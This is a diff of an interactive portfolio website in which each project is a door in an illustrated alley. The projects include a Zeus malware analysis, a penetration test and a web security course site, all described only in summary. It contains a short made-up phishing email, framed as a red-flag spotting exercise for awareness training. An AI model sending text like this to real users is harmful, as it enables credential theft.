-    <path class="frame" d="M690 640V490a48 48 0 0 1 96 0v150z" fill="#4a5a2f" stroke="#2b2117" stroke-width="2"/>
-    <path d="M700 640V494a38 38 0 0 1 76 0v146" fill="none" stroke="#3b4a24" stroke-width="2"/>
-    <circle cx="768" cy="570" r="3.5" fill="#d9a441"/>
-    <rect x="672.0" y="396" width="132" height="44" fill="#d9a441" rx="2"/><rect x="675.0" y="399" width="126" height="38" fill="none" stroke="#a87a2c" stroke-width="1"/><text class="plaque-k" x="738.0" y="413" text-anchor="middle">RESEARCH</text><text class="plaque" x="738.0" y="431" text-anchor="middle">DNA &amp; Privacy</text>
-  </g>
-
-
-  <g class="door" id="d-zeus" tabindex="0" role="button" aria-label="Open the Zeus malware analysis door">
-    <rect class="light" x="32" y="440" width="104" height="200" fill="#f1b75a" opacity="0"/>
-    <path class="frame" d="M36 640V490a48 48 0 0 1 96 0v150z" fill="#4a2f4f" stroke="#2b2117" stroke-width="2"/>
-    <path d="M46 640V494a38 38 0 0 1 76 0v146" fill="none" stroke="#3a2440" stroke-width="2"/>
-    <circle cx="114" cy="570" r="3.5" fill="#d9a441"/>
-    <rect x="18.0" y="396" width="132" height="44" fill="#d9a441" rx="2"/><rect x="21.0" y="399" width="126" height="38" fill="none" stroke="#a87a2c" stroke-width="1"/><text class="plaque-k" x="84.0" y="413" text-anchor="middle">MALWARE LAB</text><text class="plaque" x="84.0" y="431" text-anchor="middle">Zeus Trojan</text>
-  </g>
-  <g class="door" id="d-web" tabindex="0" role="button" aria-label="Open the web application security door">
-    <rect class="light" x="916" y="440" width="104" height="200" fill="#f1b75a" opacity="0"/>
-    <path class="frame" d="M920 640V490a48 48 0 0 1 96 0v150z" fill="#6b5a2f" stroke="#2b2117" stroke-width="2"/>
-    <path d="M930 640V494a38 38 0 0 1 76 0v146" fill="none" stroke="#574924" stroke-width="2"/>
-    <circle cx="998" cy="570" r="3.5" fill="#d9a441"/>
-    <rect x="902.0" y="396" width="132" height="44" fill="#d9a441" rx="2"/><rect x="905.0" y="399" width="126" height="38" fill="none" stroke="#a87a2c" stroke-width="1"/><text class="plaque-k" x="968.0" y="413" text-anchor="middle">WEB SECURITY</text><text class="plaque" x="968.0" y="431" text-anchor="middle">Hardened App</text>
-  </g>
-  <g class="door" id="d-aws" tabindex="0" role="button" aria-label="Open the Zero Trust on AWS door">
-    <rect class="light" x="1056" y="440" width="104" height="200" fill="#f1b75a" opacity="0"/>
-    <path class="frame" d="M1060 640V490a48 48 0 0 1 96 0v150z" fill="#3a4a4a" stroke="#2b2117" stroke-width="2"/>
-    <path d="M1070 640V494a38 38 0 0 1 76 0v146" fill="none" stroke="#2c3a3a" stroke-width="2"/>
-    <circle cx="1138" cy="570" r="3.5" fill="#d9a441"/>
-    <rect x="1042.0" y="396" width="132" height="44" fill="#d9a441" rx="2"/><rect x="1045.0" y="399" width="126" height="38" fill="none" stroke="#a87a2c" stroke-width="1"/><text class="plaque-k" x="1108.0" y="413" text-anchor="middle">CLOUD</text><text class="plaque" x="1108.0" y="431" text-anchor="middle">Zero Trust</text>
-  </g>
-
-  <!-- an old man on a wooden chair by the first door, reading under the lantern -->
-  <g id="reader" tabindex="0" role="button" aria-label="The old man's book: open it to see Zain's projects, 2023 to 2026" style="cursor:pointer">
-    <circle cx="232" cy="560" r="80" fill="url(#lamp)" class="glow"/>
-    <!-- chair -->
-    <path d="M168 540v100M172 600h70M240 600v40M172 612h70" stroke="#4f3823" stroke-width="7" stroke-linecap="round"/>
-    <path d="M166 538h10v66h-10z" fill="#5a3f27"/>
-    <!-- legs and shoes -->
-    <path d="M196 600h44l10 36" stroke="#2c2a33" stroke-width="15" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-    <path d="M244 636h20" stroke="#1a1410" stroke-width="9" stroke-linecap="round"/>
-    <!-- body: long brown jacket -->
-    <path d="M184 536c4-24 22-32 38-30 14 2 20 16 18 34l-4 62h-52z" fill="#5b4330"/>
-    <!-- arm reaching to the book -->
-    <path d="M222 548c12 10 22 14 30 14" stroke="#4a3626" stroke-width="13" fill="none" stroke-linecap="round"/>
-    <!-- head, beard, flat cap -->
-    <circle cx="226" cy="490" r="15" fill="#c79c78"/>
-    <path d="M214 494c2 18 10 26 18 26s12-10 10-24c-8 6-20 6-28-2z" fill="#e8e2d6"/>
-    <path d="M208 482c2-14 14-20 26-18 10 2 16 8 16 16-12-4-28-4-42 2z" fill="#3a3f45"/>
-    <path d="M232 478l22 2" stroke="#3a3f45" stroke-width="5" stroke-linecap="round"/>
-    <circle cx="234" cy="492" r="1.6" fill="#2b2117"/>
-    <!-- the book, open, glowing a little -->
-    <g id="small-book">
-      <path d="M244 556l14-10 14 10-14 6z" fill="#efe4cb" stroke="#6b2f2a" stroke-width="2"/>
-      <path d="M258 546v16" stroke="#6b2f2a" stroke-width="1.5"/>
-    </g>
-  </g>
-
-  <!-- the cat: black, yellow eyes. Walks in from the left, then sits by the doors. -->
-  <g id="cat">
-    <g id="cat-walk" transform="translate(0 0)">
-      <path class="tail" d="M58 598c-26-6-34-34-22-58" stroke="#0b0b10" stroke-width="7" fill="none" stroke-linecap="round"/>
-      <ellipse cx="96" cy="606" rx="46" ry="20" fill="#0b0b10"/>
-      <rect class="leg a" x="62" y="612" width="9" height="28" rx="4" fill="#0b0b10"/>
-      <rect class="leg b" x="78" y="612" width="9" height="28" rx="4" fill="#0b0b10"/>
-      <rect class="leg b" x="112" y="612" width="9" height="28" rx="4" fill="#0b0b10"/>
-      <rect class="leg a" x="126" y="612" width="9" height="28" rx="4" fill="#0b0b10"/>
-      <circle cx="146" cy="588" r="18" fill="#0b0b10"/>
-      <path d="M134 576l2-18 10 12zM152 570l10-12 2 18z" fill="#0b0b10"/>
-      <ellipse class="eye" cx="152" cy="586" rx="3.6" ry="3" fill="#f3d02b"/>
-      <ellipse class="eye" cx="141" cy="586" rx="3.2" ry="3" fill="#f3d02b"/>
-    </g>
-    <g id="cat-sit">
+    <symbol id="cat-sit-sym" viewBox="40 520 110 125">
       <path class="tail" d="M70 638c-30 4-36-18-22-30" stroke="#0b0b10" stroke-width="7" fill="none" stroke-linecap="round"/>
       <path d="M70 640c-6-30 0-60 26-70 26 8 32 40 26 70z" fill="#0b0b10"/>
       <circle cx="96" cy="560" r="19" fill="#0b0b10"/>
       <path d="M82 548l1-20 12 12zM98 540l12-12 1 20z" fill="#0b0b10"/>
       <ellipse class="eye" cx="89" cy="558" rx="3.6" ry="3.2" fill="#f3d02b"/>
       <ellipse class="eye" cx="103" cy="558" rx="3.6" ry="3.2" fill="#f3d02b"/>
-    </g>
-  </g>
+    </symbol>
+  </defs>
 </svg>
-</section>
 
-<main class="ground wrap">
+<header class="street" id="street" aria-label="The alley. Walk with the arrow keys, the buttons, by dragging, or by tapping a door.">
+  <svg class="sky-fixed" viewBox="0 0 1200 720" preserveAspectRatio="xMidYMin slice" aria-hidden="true">
+    <g fill="#ece3cf" opacity=".7"><circle cx="140" cy="60" r="1.2"/><circle cx="320" cy="110" r="1"/><circle cx="520" cy="40" r="1.4"/><circle cx="760" cy="90" r="1"/><circle cx="980" cy="55" r="1.3"/><circle cx="1100" cy="140" r="1"/><circle cx="640" cy="150" r=".9"/><circle cx="60" cy="170" r="1"/><circle cx="420" cy="190" r=".8"/><circle cx="870" cy="30" r="1"/></g>
+    <path d="M930 120a34 34 0 1 0 30 52 28 28 0 1 1-30-52z" fill="#ece3cf" opacity=".9"/>
+  </svg>
+  <svg class="world" id="world" role="img" aria-labelledby="world-t"><title id="world-t">A dusk alley in an old Levantine city, walked from 2024 to 2026. A black cat with yellow eyes walks it; each door is a project.</title></svg>
+  <p class="hint" id="hint">← → to walk with the cat · tap a door to go in</p>
+  <button type="button" class="prompt" id="prompt" hidden>ENTER</button>
+  <div class="pad l"><button type="button" id="goL" aria-label="Walk left">←</button></div>
+  <div class="pad r"><button type="button" id="goR" aria-label="Walk right">→</button></div>
+</header>
+
+<nav class="map gut" aria-label="Places in the alley"><ol id="map"></ol></nav>
+
+<main class="ground gut">
   <div class="inner">
     <blockquote class="mine">
       <p><span class="open">A great man once said:</span>
@@ -325,8 +384,9 @@ body{background:var(--night);color:var(--ink);font-family:var(--body);font-size:
         <span>a goal without an end.</span></p>
       <p class="reveal">That great man is me.</p>
     </blockquote>
-    <p class="nudge">The old man by the first door is reading something. <button type="button" id="ask">Look over his shoulder</button></p>
+    <p class="nudge">The old man at the start of the alley is reading something. <button type="button" class="linkish" id="ask">Look over his shoulder</button></p>
   </div>
+  <footer class="sig">Zain · <a href="https://www.linkedin.com/in/zain-moh" rel="me noopener" target="_blank">LinkedIn</a> · <a href="https://github.com/zainald3as" rel="me noopener" target="_blank">GitHub</a></footer>
 </main>
 
 <div class="veil" id="veil" hidden>
@@ -345,84 +405,1138 @@ body{background:var(--night);color:var(--ink);font-family:var(--body);font-size:
         <button type="button" id="prev" aria-label="Previous page">&#8592;</button>
         <span id="p-num"></span>
         <button type="button" id="next" aria-label="Next page">&#8594;</button>
+        <button type="button" class="go" id="p-go">Walk to this door</button>
       </div>
     </div>
   </section>
 </div>
 
+<div class="fade" id="fade"></div>
+
+<!-- ============ ROOMS ============ -->
+
+<section class="room" id="r-airport" hidden role="dialog" aria-modal="true" aria-labelledby="t-airport" style="--rbg:#1d1f26">
+  <svg class="back" data-wall="#262833" data-floor="#1a1b21" data-win="#f1b75a" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">JAVA · JAVAFX · SOCKETS</span><h2 id="t-airport">Airport Management System</h2><span class="d">Nov 2024 · RIT Dubai</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="board"><table><thead><tr><th>FLIGHT</th><th>TYPE</th><th>AIRCRAFT</th><th>DEPARTS</th><th>LANDS</th><th>STATUS</th></tr></thead><tbody id="ap-rows"></tbody></table></div>
+    <div class="two">
+      <div>
+        <p class="label">THE QUEUE · NODEQUEUE, WRITTEN FROM SCRATCH</p>
+        <div class="taxi" id="ap-taxi" aria-live="polite"></div>
+        <div class="row" style="margin-top:34px"><button class="act" id="ap-load">LOAD TO THE QUEUE</button><button class="act ghost" id="ap-go">NEXT DEPARTURE</button></div>
+      </div>
+      <div style="display:grid;gap:14px">
+        <ul class="facts">
+          <li>A desktop app for an airport's departures and landings: private, commercial and cargo planes.</li>
+          <li>JavaFX interface: upload flight files, add and remove flights, sort and filter the tables.</li>
+          <li>A class for each plane type, and flights loaded from CSV into my own linked-list queue.</li>
+          <li>A separate Java socket server that receives reschedule counts and sends them back.</li>
+        </ul>
+        <p class="later">The flights on the board are the ones from my CSV file.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-zerotrust" hidden role="dialog" aria-modal="true" aria-labelledby="t-zerotrust" style="--rbg:#17202a">
+  <svg class="back" data-wall="#1d2833" data-floor="#141b22" data-win="#7fb3c9" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">CLOUD SECURITY · RISK</span><h2 id="t-zerotrust">Zero Trust on AWS</h2><span class="d">Sep – Dec 2025 · CSEC 468 Risk Management</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div>
+        <p class="label">NEVER TRUST, ALWAYS VERIFY · SEND A REQUEST THROUGH</p>
+        <div class="gates" id="zt-gates">
+          <svg class="token" id="zt-token" viewBox="0 0 26 18" aria-hidden="true"><rect x="1" y="1" width="24" height="16" rx="2" fill="#efe4cb" stroke="#2b2117"/><path d="M1 2l12 8 12-8" fill="none" stroke="#2b2117"/></svg>
+        </div>
+        <p class="verdict mono" id="zt-verdict" aria-live="polite"></p>
+        <div class="row"><button class="act" id="zt-good">AN EMPLOYEE, WITH MFA</button><button class="act ghost" id="zt-bad">A STOLEN PASSWORD</button><button class="act ghost" id="zt-wide">TOO-WIDE IAM ROLE</button></div>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p class="note">Two phases. First, six risks to a Zero Trust setup on AWS, rated with <em>NIST SP 800-30</em> and answered with <em>NIST SP 800-207</em> controls. Then a Business Impact Analysis and a continuity plan aligned with <em>ISO 22301</em> and <em>NIST SP 800-34</em>: multi-region failover, cross-region replication, redundant identity, break-glass access.</p>
+        <p class="mine-line">I wrote the abstract, introduction and conclusion, and worked on the technical evaluation with IAM Access Analyzer, AWS Config, CloudTrail and MFA.</p>
+      </div>
+    </div>
+    <div><p class="label">THE SIX RISKS</p>
+      <ul class="risks">
+        <li><span>I</span>Insider credential misuse</li><li><span>II</span>IAM misconfiguration</li><li><span>III</span>Zero Trust applied unevenly across hybrid and multi-cloud</li>
+        <li><span>IV</span>Misreading AWS's shared responsibility model</li><li><span>V</span>API exposure and identity sprawl</li><li><span>VI</span>CI/CD pipeline bypass</li>
+      </ul></div>
+  </div>
+</section>
+
+<section class="room" id="r-archive" hidden role="dialog" aria-modal="true" aria-labelledby="t-archive" style="--rbg:#211b16">
+  <svg class="back" data-wall="#2b231b" data-floor="#1c1712" data-win="#d9a441" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">RESEARCH · LAW · PRIVACY</span><h2 id="t-archive">Genealogy Websites and the Law</h2><span class="d">Sep – Dec 2025 · first author · 41 pages, 84 references</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div style="display:grid;gap:12px;justify-items:center">
+        <svg class="helix" id="helix" viewBox="0 0 520 300" role="img" aria-label="A family tree that turns into a DNA strand"></svg>
+        <button class="act" id="ar-turn">SEND A SAMPLE</button>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p class="note">Sites like Ancestry and MyHeritage started as family trees. Now they hold DNA, and that DNA gets reused for health research, citizenship claims and police investigations. The paper asks how well the law protects it, country by country.</p>
+        <p class="mine-line" style="font-family:var(--arabic);font-style:normal;font-size:1.25rem;line-height:1.6">“In this age, belonging and survival are connected not just socially or politically, but genetically as well.”</p>
+        <p class="later">From my reflection in the paper.</p>
+      </div>
+    </div>
+    <div class="two">
+      <div><p class="label">THE CABINET · TEN COUNTRIES, OPEN A DRAWER</p><div class="cabinet" id="ar-cab"></div></div>
+      <div class="card" id="ar-card" aria-live="polite"><h3>Pick a drawer</h3><p>Each one holds the laws the paper looked at for that country.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-zeus" hidden role="dialog" aria-modal="true" aria-labelledby="t-zeus" style="--rbg:#1a1622">
+  <svg class="back" data-wall="#221c2c" data-floor="#16121c" data-win="#9b7fc9" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">MALWARE ANALYSIS</span><h2 id="t-zeus">Zeus / Zbot Banking Trojan</h2><span class="d">Jan – Apr 2026 · CSEC 202 Reverse Engineering Fundamentals</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div style="display:grid;gap:10px;justify-items:center">
+        <svg class="case" id="zeus-case" viewBox="0 0 460 340" tabindex="0" role="button" aria-label="Open the Trojan horse"></svg>
+        <p class="later" id="zeus-hint">The sample is sealed in glass. Tap the horse to open it.</p>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p class="note">A real Zeus sample from MalwareBazaar, flagged by <em>66 of 69</em> VirusTotal engines. A team of five took it apart two ways: statically in Ghidra, and alive inside an isolated sandbox.</p>
+        <div><div class="meter" aria-hidden="true"><i id="vt"></i></div><p class="later mono" style="margin-top:6px">VirusTotal · 66 / 69</p></div>
+        <p class="mine-line">I owned the code reconstruction and the dynamic analysis.</p>
+      </div>
+    </div>
+    <div id="zeus-inside" hidden>
+      <div class="tabs" role="tablist"><button role="tab" aria-selected="true" id="zt-s" aria-controls="zp-s">STATIC · GHIDRA</button><button role="tab" aria-selected="false" id="zt-d" aria-controls="zp-d">DYNAMIC · SANDBOX</button></div>
+      <div id="zp-s" role="tabpanel" aria-labelledby="zt-s" class="two">
+        <div class="scr" id="zfns"></div>
+        <div class="scr" id="zfn-out" aria-live="polite"></div>
+      </div>
+      <div id="zp-d" role="tabpanel" aria-labelledby="zt-d" hidden class="two">
+        <div class="scr"><span class="c">// processes</span><ul class="ptree"><li>explorer.exe <span class="inj">← code injected</span></li><li>&nbsp;└ svchost.exe <span class="inj">← code injected</span></li></ul><br><span class="c">// registry (RegShot diff)</span><br>keys changed for persistence: <span class="k" id="regn">0</span><br><br><span class="c">// network (Wireshark)</span><br><span id="pkts"></span></div>
+        <div style="display:grid;gap:10px"><ul class="facts"><li>Runs inside an isolated VirtualBox sandbox.</li><li>x32dbg, Process Monitor, RegShot and Wireshark to watch it work.</li><li>Injects itself into explorer.exe and svchost.exe.</li><li>Anti-debugging: ScyllaHide hooking and conditional-branch evasion.</li></ul></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-zelto" hidden role="dialog" aria-modal="true" aria-labelledby="t-zelto" style="--rbg:#221a1a">
+  <svg class="back" data-wall="#2c2020" data-floor="#1b1414" data-win="#e9897f" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">PENETRATION TEST · TEAM LEAD</span><h2 id="t-zelto">ZELTO HR</h2><span class="d">Jan – Apr 2026 · CSEC 471 Penetration Testing</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div class="phone-wrap">
+        <div class="phone"><div class="screen" id="zl-screen" aria-live="polite"></div></div>
+        <div class="steps" id="zl-dots" aria-hidden="true"></div>
+        <div class="row"><button class="act ghost" id="zl-prev">← BACK</button><button class="act" id="zl-next">NEXT STEP →</button></div>
+      </div>
+      <div style="display:grid;gap:18px;align-content:start">
+        <p class="label" id="zl-stage">STEP 1 OF 7</p>
+        <p class="note" id="zl-text"></p>
+        <div class="tally"><div><b>11</b><span>FINDINGS</span></div><div><b>3</b><span>CRITICAL</span></div><div><b>7</b><span>HIGH</span></div><div><b>1</b><span>MEDIUM</span></div></div>
+        <p class="mine-line">I led the team of five. We built the fake company ourselves (an Ubuntu server, an Android app and a Kali attacker) and then broke into it, mapping every finding to MITRE ATT&amp;CK and the OWASP Mobile and API Top 10.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room lf" id="r-lostfound" hidden role="dialog" aria-modal="true" aria-labelledby="t-lostfound" style="--rbg:#2a1a1a">
+  <svg class="back" data-wall="#2f2420" data-floor="#1e1714" data-win="#f1b75a" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">WEB SECURITY</span><h2 id="t-lostfound">Campus Lost &amp; Found</h2><span class="d">Feb – Apr 2026 · CSEC 380 Web Application Security</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <p class="note">A site where students report lost things, built twice in PHP and MySQL: once open to five attacks, once with all five closed and re-tested in Burp Suite. Every item on the shelf is one attack.</p>
+    <button class="switch" role="switch" aria-checked="false" id="lf-sw"><span class="tr"></span><span id="lf-swl">VULNERABLE VERSION</span></button>
+    <div class="shelf" id="lf-shelf"></div>
+    <div class="two">
+      <div class="card" id="lf-card" aria-live="polite"><h3>Pick something off the shelf</h3><p>Each tag says which attack it is.</p></div>
+      <p class="mine-line">My part, with a teammate: the SQL injection in the vulnerable version and its fix in the hardened one.</p>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-ransom" hidden role="dialog" aria-modal="true" aria-labelledby="t-ransom" style="--rbg:#1b1820">
+  <svg class="back" data-wall="#221e28" data-floor="#16131a" data-win="#c0463c" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">INCIDENT RESPONSE · DISASTER RECOVERY</span><h2 id="t-ransom">Ransomware at XYZ Corporation</h2><span class="d">Jan – Apr 2026 · CSEC 577 Disaster Recovery</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <p class="note">A bank in Dubai, London and Singapore. The attacker sat in the network for <em>21 days</em>, then encrypted <em>60%</em> of the production databases in the Dubai data center. With a team of five I wrote what happens next: incident response, disaster recovery and business continuity.</p>
+    <div class="two">
+      <div style="display:grid;gap:12px">
+        <p class="label">DUBAI DATA CENTER</p>
+        <div class="racks" id="rs-racks" aria-hidden="true"></div>
+        <label class="label" for="rs-t" style="margin-top:8px">DRAG THROUGH THE FIRST 72 HOURS · <span id="rs-h" class="mono">T+0</span></label>
+        <input type="range" class="slider" id="rs-t" min="0" max="72" value="0" step="1">
+        <ul class="tl" id="rs-tl"></ul>
+      </div>
+      <div style="display:grid;gap:12px">
+        <svg class="mapsvg" id="rs-map" viewBox="0 0 520 260" role="img" aria-label="Recovery moves from Dubai to London; Singapore runs at half capacity"></svg>
+        <div class="fork"><p class="q">Was data stolen before the encryption?</p><div class="seg" id="f1"><button aria-pressed="false" data-v="y">CONFIRMED</button><button aria-pressed="false" data-v="n">NOT CONFIRMED</button></div><p class="note" id="f1t" aria-live="polite"></p></div>
+        <div class="fork"><p class="q">Are the backups clean?</p><div class="seg" id="f2"><button aria-pressed="false" data-v="y">CLEAN</button><button aria-pressed="false" data-v="n">COMPROMISED</button></div><p class="note" id="f2t" aria-live="polite"></p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-cipher" hidden role="dialog" aria-modal="true" aria-labelledby="t-cipher" style="--rbg:#1e1a14">
+  <svg class="back" data-wall="#29231a" data-floor="#1a1610" data-win="#d9a441" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">CRYPTOGRAPHY · C</span><h2 id="t-cipher">Hybrid Caesar–Monoalphabetic Cipher</h2><span class="d">Sep 2026 – now · CSCI 462 Introduction to Cryptography</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div style="display:grid;gap:10px">
+        <svg class="wheel" id="wheel" viewBox="-160 -160 320 320" role="img" aria-label="A brass Caesar wheel. Drag or use the buttons to turn it."></svg>
+        <div class="row" style="justify-content:center"><button class="act ghost" id="wh-l" aria-label="Shift left">−1</button><span class="mono" id="wh-n" style="min-width:5em;text-align:center">shift 3</span><button class="act ghost" id="wh-r" aria-label="Shift right">+1</button></div>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p class="note">Six letters through a Caesar shift, then eight through a substitution table, then six again, and on. Each Caesar shift comes from the next letter, and the substitution table rotates after every three uses.</p>
+        <label class="label" for="ci-in">TYPE SOMETHING TO SEE HOW IT GETS SPLIT</label>
+        <input class="field-in" id="ci-in" value="KNOWLEDGE IS LIMITLESS AND I AM LIMITED" maxlength="80" autocomplete="off" spellcheck="false">
+        <div class="blocks" id="ci-out" aria-live="polite"></div>
+        <p class="mine-line">My role: I developed the decryption algorithm. Each Caesar shift depends on a letter that was itself substituted, so the decryption first reverses that substitution to recover the exact shift. Every block is recovered without guessing.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-qsoc" hidden role="dialog" aria-modal="true" aria-labelledby="t-qsoc" style="--rbg:#0f1520">
+  <svg class="back" data-wall="#131b28" data-floor="#0c111a" data-win="#2f7f7a" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">GRADUATION PROJECT · SOC · POST-QUANTUM</span><h2 id="t-qsoc">QuantumSOC</h2><span class="d">Sep 2026 – Dec 2026 · in progress</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <p class="note">Quantum computers will break RSA and elliptic-curve crypto one day, and most SOCs can't even see which crypto their traffic uses. I'm building a testbed where a real TLS 1.3 handshake runs on <em>ML-KEM-768</em> and <em>ML-DSA-65</em>, next to the classical version, watched in Splunk, to measure how ready a SOC really is.</p>
+    <div class="two">
+      <div class="soc">
+        <div class="row" style="justify-content:space-between"><p class="label" style="margin:0">ONE HANDSHAKE</p><div class="seg" id="qs-mode"><button aria-pressed="true" data-v="c">CLASSICAL</button><button aria-pressed="false" data-v="q">POST-QUANTUM</button></div></div>
+        <svg class="hs" id="qs-hs" viewBox="0 0 520 200" role="img" aria-label="Client and server exchanging handshake messages"></svg>
+        <div class="bars" id="qs-bars"></div>
+        <p class="later" style="color:#7d8f9c">Sizes in bytes. Same handshake, much bigger messages: that is what a SOC's tools have to learn to read.</p>
+      </div>
+      <div class="soc">
+        <p class="label" style="margin:0">WHAT SPLUNK SEES · SAMPLE EVENTS</p>
+        <div class="feed" id="qs-feed" aria-hidden="true"></div>
+        <div class="row" style="align-items:center;gap:18px"><svg class="gauge" id="qs-gauge" viewBox="0 0 200 120" aria-hidden="true"></svg><p class="note" style="font-size:.98rem">The end result: a <em>Quantum Readiness Score</em> built from measured telemetry instead of surveys. Still being built, done by December.</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-cyberus" hidden role="dialog" aria-modal="true" aria-labelledby="t-cyberus" style="--rbg:#181b24">
+  <svg class="back" data-wall="#1e2230" data-floor="#141720" data-win="#7fb3c9" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">AI · SECURITY TRAINING · DRAVERON</span><h2 id="t-cyberus">Cyberus Academy</h2><span class="d">Sep 2026 – now · AI &amp; Cybersecurity Consultant</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div style="display:grid;gap:12px;justify-items:center">
+        <svg class="loop" id="cy-loop" viewBox="0 0 520 300" role="img" aria-label="The AI coach loop: generate, validate, then show it to the learner or retry"></svg>
+        <button class="act" id="cy-run">RUN THE LOOP</button>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p class="note">A platform that teaches people to spot attacks. Its AI coach writes realistic phishing emails and chat attacks, and every one is checked before a learner sees it; if it fails, it's written again. I work on how fast and how reliably that loop runs.</p>
+        <p class="label">A PRACTICE EMAIL · FIND THE FOUR RED FLAGS</p>
+        <div class="mail" id="cy-mail">
+          <div class="hdr">From: IT Support &lt;support@micros0ft-helpdesk.co&gt;<br>Subject: <button class="flag" data-f="URGENT: your account will be deleted today">URGENT: your account will be deleted today</button></div>
+          <p>Dear <button class="flag" data-f="Dear user">user</button>,</p>
+          <p style="margin-top:8px">We noticed unusual sign-in activity. To keep your mailbox, confirm your password within 2 hours using the link below.</p>
+          <p style="margin-top:8px"><button class="flag" data-f="link">verify-account-now.example/login</button></p>
+          <p style="margin-top:8px">Thanks,<br>IT Support · <button class="flag" data-f="sender">micros0ft-helpdesk.co</button></p>
+        </div>
+        <p class="found" id="cy-found" aria-live="polite">0 / 4 found</p>
+        <p class="later">A made-up example of the kind of scenario the coach writes.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-kitchen" hidden role="dialog" aria-modal="true" aria-labelledby="t-kitchen" style="--rbg:#241a14">
+  <svg class="back" data-wall="#2e2219" data-floor="#1d1510" data-win="#f1b75a" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">THE KITCHEN</span><h2 id="t-kitchen">Pastry, and maybe culinary school</h2><span class="d">Not a project. Just me.</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div style="display:grid;gap:12px;justify-items:center"><svg class="scene-svg" id="kitchen" viewBox="0 0 640 420" role="img" aria-label="A small kitchen with an oven. Open it."></svg><div class="row"><button class="act" id="k-open">OPEN THE OVEN</button><span class="mono later" id="k-n" aria-live="polite"></span></div></div>
+      <div style="display:grid;gap:14px;align-content:start">
+        <p class="note">I've worked as a pastry chef, and culinary school is still on my list.</p>
+        <p class="later">The oven is full of ma'amoul. Take one.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-roof" hidden role="dialog" aria-modal="true" aria-labelledby="t-roof" style="--rbg:#0c1020">
+  <svg class="back" data-wall="#0c1020" data-floor="#141826" data-win="none" data-sky="1" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">THE ROOFTOP</span><h2 id="t-roof">Quantum physics, one day</h2><span class="d">The dream after this degree</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div style="display:grid;gap:12px">
+        <svg class="bloch" id="bloch" viewBox="-170 -170 340 340" role="img" aria-label="A Bloch sphere showing one qubit"></svg>
+        <p class="qstate" id="q-state" aria-live="polite"></p>
+        <div class="row" style="justify-content:center"><button class="act ghost" data-g="X">X</button><button class="act ghost" data-g="H">H</button><button class="act ghost" data-g="Z">Z</button><button class="act" data-g="M">MEASURE</button><button class="act ghost" data-g="R">RESET</button></div>
+      </div>
+      <div style="display:grid;gap:16px;align-content:start">
+        <p class="chalk" style="font-size:2rem;text-align:center;direction:ltr">iħ ∂ψ/∂t = Ĥψ</p>
+        <p class="note">My dream is to study advanced quantum physics and connect it to quantum computers. QuantumSOC is the security side of that future; this is the physics side.</p>
+        <p class="note" style="font-size:.98rem">This is one qubit. <em>X</em> flips it, <em>H</em> puts it into superposition, <em>Z</em> turns its phase, and <em>Measure</em> forces it to pick 0 or 1, with the odds you can see on the sphere.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="room" id="r-cat" hidden role="dialog" aria-modal="true" aria-labelledby="t-cat" style="--rbg:#1d1a24">
+  <svg class="back" data-wall="#25202d" data-floor="#191620" data-win="#f1b75a" aria-hidden="true"></svg>
+  <div class="bar"><div class="title"><span class="k">THE CAT'S CORNER</span><h2 id="t-cat">BSBS</h2><span class="d">Black, with yellow eyes</span></div><button class="leave" data-leave>← BACK TO THE ALLEY</button></div>
+  <div class="body">
+    <div class="two">
+      <div style="position:relative;display:grid;justify-items:center;gap:10px"><svg class="scene-svg" id="bsbs" viewBox="0 0 640 400" role="button" tabindex="0" aria-label="Pet BSBS" style="cursor:pointer"></svg><p class="later mono" id="pets" aria-live="polite">pets: 0</p></div>
